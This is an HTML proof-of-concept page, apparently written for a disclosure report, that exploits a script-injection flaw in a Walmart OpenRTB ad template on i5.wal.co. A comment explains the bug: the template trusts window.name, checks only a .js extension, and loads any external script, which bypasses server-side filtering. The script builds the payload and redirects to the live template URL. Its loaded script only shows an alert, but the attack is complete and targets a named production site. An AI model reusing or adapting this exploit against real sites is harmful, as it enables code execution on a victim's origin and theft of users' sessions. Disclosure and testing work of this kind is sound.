<title>PoC</title>
<!--
  WC-124 - arbitrary script execution on i5.wal.co via the OpenRTB ad template.

  Open this page. It writes the payload into this browsing context's window.name and then
  navigates the SAME TAB to the template, which reads window.name in preference to its
  ?data= parameter, takes the tracker URL out of eventTrackers[], checks only that its file
  extension is `.js`, and inserts it as a <script src>. No origin allowlist, no scheme check.

  Because the payload travels in window.name, it never reaches Walmart's servers and is
  therefore never subject to their edge filtering.

  The payload is a public 215-byte file whose entire contents are `alert(document.domain)`,
  so the dialog that appears states the origin the code ran on.
-->
<script>
  window.name = encodeURIComponent(JSON.stringify({
    data: {
      id: "poc",
      config: { track3PEnable: true },
      content: {
        assets: {},
        eventTrackers: [
          { event: 1, method: 2, url: "https://cdn.jsdelivr.net/gh/renniepak/xss/xss.js" }
        ]
      }
    }
  }));
  location.href = "https://i5.wal.co/dfw/63fd9f59-4c54/7adb6fe1-4149-4ebe-b4c7-2ea1921d4a19/v356/openrtb-template-wrapper.html";
</script>
